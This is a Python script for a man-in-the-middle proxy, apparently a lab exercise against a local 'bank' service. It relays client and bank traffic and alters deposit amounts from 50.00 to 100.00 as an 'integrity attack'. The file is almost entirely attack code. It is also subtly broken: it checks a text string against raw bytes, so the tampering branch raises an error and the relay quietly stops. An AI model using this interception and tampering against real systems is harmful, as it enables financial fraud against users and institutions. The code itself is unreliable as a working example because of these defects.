import socket
import threading
import signal
import sys

LISTEN_PORT = 4000
BANK_IP = "127.0.0.1"
BANK_PORT = 3000

running = True

def relay(source, destination, label):
    try:
        while True:
            data = source.recv(4096)
            if not data:
                print(f"[MITM] No data received on {label}, closing...")
                break
            
            # Modify data for integrity attack (example: increase deposit amount)
            if "deposit" in data:
                print(f"[MITM] Integrity attack: Modifying deposit amount")
                data = data.replace(b"50.00", b"100.00")  # Modify deposit amount from 50 to 100

            print(f"[MITM] Relaying data ({label}): {data}")
            destination.sendall(data)
    except Exception as e:
        print(f"[MITM] Relay error ({label}): {e}")

def handle_connection(client_sock):
    print(f"[MITM] Handling new connection!")
    try:
        # Connect to real bank
        bank_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bank_sock.connect((BANK_IP, BANK_PORT))

        # Two-way relay
        t1 = threading.Thread(target=relay, args=(client_sock, bank_sock, "client→bank"))
        t2 = threading.Thread(target=relay, args=(bank_sock, client_sock, "bank→client"))

        t1.start()
        t2.start()
        t1.join()
        t2.join()
    finally:
        client_sock.close()
        bank_sock.close()

def start_mitm():
    global running
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"[DEBUG] Attempting to bind to {LISTEN_PORT}")
    server_sock.bind(("0.0.0.0", LISTEN_PORT))
    print(f"[DEBUG] Successfully bound to {LISTEN_PORT}")
    server_sock.listen(5)
    print(f"[MITM] Listening on port {LISTEN_PORT}...")

    def stop_handler(sig, frame):
        global running
        print("\n[MITM] Shutting down MITM...")
        running = False
        server_sock.close()
        sys.exit(0)

    signal.signal(signal.SIGTERM, stop_handler)
    signal.signal(signal.SIGINT, stop_handler)

    while running:
        try:
            client_sock, addr = server_sock.accept()
            print(f"[MITM] Connection from {addr}")
            threading.Thread(target=handle_connection, args=(client_sock,), daemon=True).start()
        except Exception as e:
            if running:
                print(f"[MITM] Error accepting connection: {e}")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", type=int, default=4000, help="Port to listen on")
    parser.add_argument("-s", type=str, default="127.0.0.1", help="Real bank IP")
    parser.add_argument("-q", type=int, default=3000, help="Real bank port")

    args = parser.parse_args()
    LISTEN_PORT = args.p
    BANK_IP = args.s
    BANK_PORT = args.q

    start_mitm()
